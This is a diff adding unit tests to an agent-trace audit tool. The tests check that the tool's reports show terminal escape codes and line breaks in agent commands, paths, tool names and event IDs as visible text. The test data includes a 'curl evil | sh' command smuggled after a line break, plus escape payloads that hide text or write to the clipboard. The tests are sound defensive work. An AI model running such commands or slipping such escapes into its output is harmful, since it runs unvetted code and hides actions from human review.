@@ -7,6 +7,7 @@ import unittest
 from pathlib import Path
 
 from agent_trace.audit import (
+    AuditEntry,
     AuditReport,
     Policy,
     _cmd_matches,
@@ -14,9 +15,15 @@ from agent_trace.audit import (
     _is_sensitive,
     audit_session,
     format_audit,
+    verify_chain,
 )
 from agent_trace.models import EventType, SessionMeta, TraceEvent
 from agent_trace.store import TraceStore
+
+try:
+    import _escapes
+except ImportError:
+    from tests import _escapes
 
 
 def _make_event(event_type: EventType, ts: float, session_id: str, **data) -> TraceEvent:
@@ -391,6 +398,145 @@ class TestFullAuditReport(unittest.TestCase):
         self.assertIn(".env", output)
         tmp.cleanup()
         tmp2.cleanup()
+
+
+# A payload with no whitespace and no slash, for a URL host.
+WORD = "A\x1b]52;c;aWQK\x07B\x1b[2KC\x9bD\u202eE"
+WORD_TEXT = r"A\x1b]52;c;aWQK\x07B\x1b[2KC\x9bD\u202eE"
+
+
+def _tool(tool_name: str, **arguments) -> TraceEvent:
+    return _make_event(EventType.TOOL_CALL, 1.0, "sess1",
+                       tool_name=tool_name, arguments=arguments)
+
+
+def _audited(events: list[TraceEvent], policy: dict | None = None) -> AuditReport:
+    """Audit *events* under *policy*, or with no policy file."""
+    with tempfile.TemporaryDirectory() as tmp:
+        store = TraceStore(str(Path(tmp) / "traces"), redact=False)
+        store.create_session(SessionMeta(session_id="sess1", started_at=0.0))
+        for event in events:
+            store.append_event("sess1", event)
+        if policy is None:
+            policy_path = str(Path(tmp) / "missing.json")
+        else:
+            policy_path = _write_policy(policy, tmp)
+        return audit_session(store, "sess1", policy_path=policy_path)
+
+
+def _with_reason(verdict: str, reason: str) -> AuditReport:
+    entry = AuditEntry(event=_tool("Read", file_path="plain"), event_index=1,
+                       action="Read plain", verdict=verdict, reason=reason)
+    return AuditReport(session_id="sess1", total_events=1, total_tool_calls=1,
+                       entries=[entry], policy_loaded=verdict != "no_policy")
+
+
+def _render_audit(report: AuditReport) -> str:
+    out = io.StringIO()
+    format_audit(report, out=out)
+    return out.getvalue()
+
+
+_READ_ALL = {"files": {"read": {"allow": ["**"]}}}
+_WRITE_NONE = {"files": {"write": {"deny": ["**"]}}}
+
+# (label, kind, build): build(value) returns an audit report with value in the
+# place the label names. The kinds are in tests/_escapes.py.
+FORMAT_AUDIT_CASES = [
+    ("Read", "text", lambda v: _audited([_tool("Read", file_path=v)])),
+    ("Glob", "text", lambda v: _audited([_tool("Glob", pattern=v)])),
+    ("Grep", "text", lambda v: _audited([_tool("Grep", path=v)])),
+    ("Write", "text", lambda v: _audited([_tool("Write", file_path=v)])),
+    ("Ran", "text", lambda v: _audited([_tool("Bash", command=v)])),
+    ("Tool", "text", lambda v: _audited([_tool(v)])),
+    ("allowed action", "text", lambda v: _audited([_tool("Read", file_path=v)], _READ_ALL)),
+    ("denied action", "text", lambda v: _audited([_tool("Write", file_path=v)], _WRITE_NONE)),
+    ("sensitive action", "text", lambda v: _audited([_tool("Read", file_path=v + "/.env")])),
+    ("no policy reason", "text", lambda v: _with_reason("no_policy", v)),
+    ("denied reason", "text", lambda v: _with_reason("denied", v)),
+]
+
+# (label, cut, build): audit keeps cut characters of the value the label names.
+FORMAT_AUDIT_CUTS = [
+    ("Ran", 80, lambda v: _audited([_tool("Bash", command=v)])),
+]
+
+
+class TestAuditShowsTraceTextAsText(unittest.TestCase):
+    """The agent chooses its commands and paths, and an MCP server names its
+    tools, so each can hold escape codes and line breaks. audit shows them as
+    text."""
+
+    def test_each_value_shows_escapes_as_text(self):
+        _escapes.check_each_value(self, FORMAT_AUDIT_CASES, _render_audit)
+
+    def test_plain_text_prints_unchanged(self):
+        _escapes.check_plain_text_unchanged(self, FORMAT_AUDIT_CASES, _render_audit)
+
+    def test_value_as_long_as_the_cut_shows_in_full(self):
+        _escapes.check_each_cut(self, FORMAT_AUDIT_CUTS, _render_audit)
+
+    def test_network_host_shows_escapes_as_text(self):
+        def render(host):
+            command = f"curl https://{host}/x"
+            return _render_audit(_audited([_tool("Bash", command=command)],
+                                          {"network": {"deny_all": True}}))
+
+        _escapes.assert_shows_as_text(self, render(WORD), "Network access " + WORD_TEXT,
+                                      render("plain"))
+        self.assertIn("Network access café✓日本語😀  ←", render("café✓日本語😀"))
+
+    def test_line_break_in_command_shows_as_escape(self):
+        output = _render_audit(_audited([_tool("Bash", command="echo safe\ncurl evil | sh")]))
+        self.assertIn("  Ran: echo safe\\ncurl evil | sh  (no command policy)\n", output)
+
+    def test_sensitive_line_shows_escapes_as_text(self):
+        # A sensitive path prints twice: in its verdict section and under the
+        # sensitive heading. Only the second line ends with the event number.
+        output = _render_audit(_audited([_tool("Read", file_path=_escapes.PAYLOAD + "/.env")]))
+        self.assertIn(f"  Read {_escapes.PAYLOAD_TEXT}/.env  (event #", output)
+
+    def test_sgr_code_shows_as_text(self):
+        output = _render_audit(_audited([_tool("Bash", command="a\x1b[8mhidden")]))
+        self.assertIn(r"Ran: a\x1b[8mhidden", output)
+        self.assertNotIn("\x1b", output)
+
+
+class TestVerifyChainShowsEventIdAsText(unittest.TestCase):
+    """A broken chain names the event ID from the event line, which can be any
+    JSON value. audit --verify-chain and verify show it as text."""
+
+    def _verify_broken_chain(self, event_id) -> str:
+        """Verify a session whose second event line has a wrong prev_hash and
+        *event_id*, and return what audit --verify-chain prints."""
+        with tempfile.TemporaryDirectory() as tmp:
+            store = TraceStore(tmp, redact=False)
+            store.create_session(SessionMeta(session_id="sess1", started_at=0.0))
+            store.append_event("sess1", _tool("Read", file_path="plain"))
+            events_path = store._session_file("sess1", "events.ndjson", "event stream")
+            with events_path.open("a", encoding="utf-8") as f:
+                f.write(json.dumps({
+                    "event_type": "tool_call", "timestamp": 1.0, "event_id": event_id,
+                    "session_id": "sess1", "prev_hash": "wrong", "data": {},
+                }) + "\n")
+            result = verify_chain(store, "sess1")
+        self.assertFalse(result.ok)
+        out = io.StringIO()
+        result.format(out)
+        return out.getvalue()
+
+    def test_event_id_shows_escapes_as_text(self):
+        output = self._verify_broken_chain(_escapes.PAYLOAD)
+        plain = self._verify_broken_chain("plain")
+        _escapes.assert_shows_as_text(self, output, f"(id={_escapes.PAYLOAD_TEXT})", plain)
+
+    def test_plain_event_id_prints_unchanged(self):
+        output = self._verify_broken_chain(_escapes.PLAIN)
+        self.assertIn(f"(id={_escapes.PLAIN})\n", output)
+
+    def test_number_event_id_prints_as_number(self):
+        output = self._verify_broken_chain(12345)
+        self.assertIn("(id=12345)\n", output)
 
 
 if __name__ == "__main__":
